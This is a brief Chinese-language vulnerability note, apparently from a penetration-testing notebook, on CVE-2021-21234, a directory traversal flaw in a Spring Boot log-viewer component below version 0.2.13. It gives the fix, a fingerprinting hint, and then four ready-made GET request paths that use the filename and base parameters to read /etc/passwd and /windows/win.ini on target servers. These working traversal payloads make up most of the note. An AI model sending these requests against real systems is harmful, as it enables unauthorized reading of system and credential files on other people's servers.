# Springboot

---
- 漏洞编号：CVE-2021-21234
- 时间：2021.10.19
- 类别：目录遍历
- 漏洞影响范围：版本<0.2.13
- 修复方案：升级到0.2.13
- 特征：图标为背景为绿云的白桃

```
GET path:
	  - "{{BaseURL}}/manage/log/view?filename=/windows/win.ini&base=../../../../../../../../../../" # Windows
      - "{{BaseURL}}/log/view?filename=/windows/win.ini&base=../../../../../../../../../../" # windows
      - "{{BaseURL}}/manage/log/view?filename=/etc/passwd&base=../../../../../../../../../../" # linux
      - "{{BaseURL}}/log/view?filename=/etc/passwd&base=../../../../../../../../../../" # linux
```

